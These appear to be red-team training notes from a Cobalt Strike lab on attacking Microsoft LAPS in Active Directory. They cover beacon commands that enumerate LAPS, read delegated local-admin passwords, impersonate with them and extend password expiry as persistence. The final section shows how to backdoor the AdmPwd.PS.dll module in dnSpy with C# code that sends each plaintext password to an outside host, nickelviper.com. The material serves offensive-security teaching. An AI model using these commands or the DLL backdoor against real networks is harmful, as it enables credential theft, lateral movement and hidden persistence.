# Local Administrator Password Solution

Most orgs build VMs from a gold image to ensure consistency and compliance. This can result in every machine having the same password on accounts such as LA. If one machine and therefore LA password hash is compromised, an attacker may be able to move laterally to every machine in the domain using the same set of credentials.

LAPS manages the creds of a LA account on every machine, either the default RID 500 or a custom account. This ensures the password for each account is different, random, and automatically changed on a defined schedule. Permission to request and reset the credentials can be delegated (but also logged). A summary of how LAPS works:

1. AD adds two new properties to computer objects: ms-Mcs-AdmPwd and ms-Mcs-AdmPwdExpirationTime
2. By default, the DACL on ms-Mcs-AdmPwd grants read access to Domain Admins, and each computer object has permission to update these properties on itself
3. Rights to read AdmPwd can be delegated to other principals (users, groups etc), typically done at the OU
4. A new GPO template is installed, used to deploy the LAPS configuration to machines
5. The LAPS client is installed on every machine (commonly via GPO)
6. When a machine does gpupdate, it checks the AdmPwdExpirationTime property on its own object in AD. If the time has elapsed, it generates a new password and sets it on the ms-Mcs-AdmPwd property.

Ways to look for LAPS:

1: If applied to a machine you have access to, AdmPwd.dll will be on disk:

    beacon> run hostname
    wkstn-2
    beacon> ls C:\Program Files\LAPS\CSE

2: Search for GPOs that have "LAPS" or some other descriptive term in the name.

    beacon> powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

3: Look for computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this):

    beacon> powershell Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName

If find the correct GPO, download the LAPS configuration from the gpcfilesyspath:

    beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine
    
     Size     Type    Last Modified         Name
     ----     ----    -------------         ----
     920b     fil     08/16/2022 12:22:23   Registry.pol
    
    beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol

The Parse-PolFile cmdlet from [GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser) can convert this to human-readable format:

    PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol
    KeyName     : Software\Policies\Microsoft Services\AdmPwd
    ValueName   : PasswordComplexity
    ValueType   : REG_DWORD
    ValueLength : 4
    ValueData   : 3
    ...

These entries tell us the password requirements.

## Reading ms-Mcs-AdmPwd

Can discover which principals allowed to read ms-Mcs-AdmPwd by reading its DACL on each computer object:

    beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier

    CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io         S-1-5-21-569305411-121244042-2357301523-1107
    ...

    beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
    DEV\Developers
    beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1108
    DEV\Support Engineers

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) also does this; Find-LAPSDelegatedGroups queries each OU for domain groups that have delegated read access:

    beacon> powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
    beacon> powershell Find-LAPSDelegatedGroups
    
Find-AdmPwdExtendedRights queries each computer for users that have "All Extended Rights". This will reveal any users that can read the attribute without being delegated to them. To get a computer's password read the attribute:

    beacon> getuid
    [*] You are DEV\bfarmer
    beacon> powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd
    ms-mcs-admpwd 
    ------------- 
    1N3FyjJR5L18za

make_token is an easy way to use it:

    beacon> make_token .\LapsAdmin 1N3FyjJR5L18za
    [+] Impersonated DEV\bfarmer
    beacon> ls \\wkstn-1\c$

## Password Expiration Protection

One of the LAPS policy settings is "Do not allow password expiration time longer than required by policy". This is the PwdExpirationProtectionEnabled configuration that we read from the Registry.pol file. When enabled, this policy prevents a user or computer setting the expiration date of a password beyond the password age specified in the PasswordAgeDays setting. We also read from Registry.pol that this is set to 30 days. If password expiration protection is enabled and we attempted to modify its expiration date beyond 31st January, it would trigger an automatic reset of that password. If the policy setting is left "not configured" in the GPO, then password expiration protection is disabled by default. 

In the lab, since we were able to compromise WKSTN-1 using its LAPS password, we can set its expiration long into the future as a form of persistence. The expiration date is an 18-digit timestamp calculated as the number of 100-nanosecond intervals that have elapsed since 1st January 1601.

    beacon> powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
    ms-mcs-admpwdexpirationtime ms-mcs-admpwd 
    --------------------------- ------------- 
             133101494718702551 1N3FyjJR5L18za

[This site](https://www.epochconverter.com/ldap) can translate these timestamps.

To push the expiry out by 10 years, overwrite this value with 136257686710000000 (it's visible to admins and a manual reset will change the password and restore the expiration date). Every computer has delegated access to write to this password field, so we must elevate to SYSTEM on WKSTN-1.

    beacon> run hostname
    wkstn-1
    beacon> getuid
    [*] You are NT AUTHORITY\SYSTEM (admin)
    beacon> powershell Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose

## LAPS Backdoors

Techniques to backdoor the LAPS admin tooling and copy passwords viewable by an admin. If installed, the LAPS PowerShell modules can be found here:

    beacon> ls
    [*] Listing: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\
     24kb     fil     05/05/2021 12:04:14   AdmPwd.PS.dll
     5kb      fil     04/28/2021 18:56:38   AdmPwd.PS.format.ps1xml
     4kb      fil     04/28/2021 18:56:38   AdmPwd.PS.psd1
     26kb     fil     05/05/2021 12:04:14   AdmPwd.Utils.dll

The DLLs are written in C# which makes them fairly trivial to download, modify and re-upload:

1. Download AdmPwd.PS.dll and AdmPwd.Utils.dll and sync them to your attacking machine
2. Open AdmPwd.PS.dll with dnSpy.
3. Use the Assembly Explorer to drill down into the DLL, namespaces and classes until you find the GetPassword method (AdmPwd.PS > dmPwd.PS > GetPassword)

This method calls DirectoryUtils.GetPasswordInfo, returning a PasswordInfo object. Click on the name  to see the class definition, which contains properties for ComputerName, DistinguishedName, Password and ExpirationTimestamp. The password is simply the plaintext password that is shown to the admin.

Modify the code to send the plaintext passwords to us over an HTTP GET request. (An irresponsible method to for the real world, since the password is sent unencrypted.)

4. Go back to the GetPassword method, right-click somewhere in the main window and select Edit Method
5. Add a new assembly reference, using the button at the bottom of the edit window (Add Assembly Reference GAC)
6. Search for and add System.Net. This will simply instantiate a new WebClient and call the DownloadString method, passing the computer name and password in the URI:

        using System.net;
        ...
        // Inside the foreach in ProcessRecord():
        // begin backdoor
        using (var client = new webclient())
        {
          client.BaseAddress = "http://nickelviper.com";
          try
          {
            client.DownloadString($"?computer={passwordInfo.ComputerName}&pass=[passwordInfo.Password}");
          }
          catch
          {
            // nop
          }
        }
        // end backdoor
 
7. Click Compile button.
8. Select File > Save Module
9. Upload the DLL back to the target to overwrite the existing file: ```beacon> upload C:\Users\Attacker\Desktop\AdmPwd.PS.dll```

One downside to this tactic is that it will break the digital signature of the DLL, but it will not prevent PowerShell from using it. (Well then, whadafu is the point of signing binaries?!?)

    beacon> powershell Get-AuthenticodeSignature *.dll
    Directory: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS
    SignerCertificate                         Status                                 Path
    -----------------                         ------                                 ----         
                                              NotSigned                              AdmPwd.PS.dll         
    ABDCA79AF9DD48A0EA702AD45260B3C03093FB4B  Valid                                  AdmPwd.Utils.dll

10. As nlamb on Workstation 1, grab the LAPS password for a computer:

        PS C:\Users\nlamb> Get-AdmPwdPassword -ComputerName sql-2 | fl
        ComputerName        : SQL-2
        DistinguishedName   : CN=SQL-2,OU=SQL Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io
        Password            : VloWch1sc5Hl40
        ExpirationTimestamp : 9/17/2022 12:46:28 PM

There should be a corresponding hit in the CS weblog.

